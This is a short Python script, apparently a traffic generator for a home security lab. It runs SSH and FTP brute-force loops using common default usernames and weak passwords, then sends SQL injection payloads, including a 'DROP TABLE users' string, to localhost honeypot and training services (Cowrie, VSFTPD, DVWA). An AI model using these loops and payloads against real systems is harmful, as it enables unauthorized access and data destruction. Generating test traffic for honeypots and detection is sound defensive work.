import paramiko
import ftplib
import urllib.request
import urllib.parse
import random
import time

print("""
========================================
   [!] INITIATING CHAOS GENERATOR [!]
========================================
""")

users = ["root", "admin", "postgres", "user", "test", "oracle"]
passwords = ["123456", "password", "admin123", "root", "toor", "qwerty"]
sql_payloads = ["admin' OR 1=1 --", "'; DROP TABLE users;--", "admin' #"]

# 1. SSH Brute Force (Target: Cowrie)
print("[+] Launching SSH Brute Force against Cowrie (Port 2222)...")
for i in range(25):
    u = random.choice(users)
    p = random.choice(passwords)
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect('localhost', port=2222, username=u, password=p, timeout=2)
        ssh.close()
    except Exception:
        pass # We expect it to fail and drop the connection!

# 2. FTP Brute Force (Target: VSFTPD)
print("[+] Launching FTP Brute Force against VSFTPD (Port 21)...")
for i in range(25):
    u = random.choice(users)
    p = random.choice(passwords)
    try:
        ftp = ftplib.FTP()
        ftp.connect('localhost', 21, timeout=2)
        ftp.login(u, p)
        ftp.quit()
    except Exception:
        pass

# 3. Web SQLi Scan (Target: DVWA)
print("[+] Launching SQL Injection Scans against DVWA (Port 8080)...")
for i in range(25):
    payload = random.choice(sql_payloads)
    url = f"http://localhost:8080/login.php?username={urllib.parse.quote(payload)}&password=badpass&Login=Login"
    try:
        urllib.request.urlopen(url, timeout=2)
    except Exception:
        pass

print("\n========================================")
print("   [+] CHAOS SIMULATION COMPLETE!   ")
print("========================================")